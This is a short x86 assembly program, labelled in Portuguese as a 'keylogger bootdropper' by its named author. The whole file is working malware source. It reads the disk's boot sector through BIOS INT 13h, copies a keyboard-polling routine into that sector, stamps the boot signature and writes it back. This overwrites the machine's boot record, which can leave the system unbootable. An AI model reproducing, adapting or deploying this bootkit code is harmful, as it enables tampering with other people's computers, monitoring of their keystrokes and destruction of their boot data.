;keylogger bootdropper. criado, escrito por mim, o programador de computadores bruno guimarães salvador
org 0x100
mov ax,201h
mov bx,SETOR
mov cx,1
mov dx,0H
int 13h

mov ah,8
mov dx,0H
mov di,0
push es
mov es,di
INT 13H
pop es

mov ax,301h
sub cl,6
mov dl,0H
MOV WORD[SETOR+510],0AA55H
mov bx,SETOR
INT 13H

LEA DI,[SETOR+3EH]
MOV SI,KEYLOGGER
MOV CX,200
REP MOVSB

mov bx,SETOR
MOV WORD[SETOR+510],0AA55H
mov ax,301h
mov cx,1
mov dx,0H
INT 13H

ret


KEYLOGGER:
      cli	      
	    xor ax,ax
	    mov ds,ax
	    mov es,ax
	    mov ss,ax
	    mov sp,07C00h
	sti
Kernel:

IN AL,60H
CMP AL,1
JNZ Kernel
mov ah,8
mov dl,0H
mov di,0
push es
mov es,di
INT 13H
pop es
sub cl,6
	mov ax,0000h
	mov es,ax
	mov bx,500h
	mov dl,0h
	mov al,01h
	mov ah,02h
	int 13h
jmp 0000:0500h

SETOR db 512 dup (0)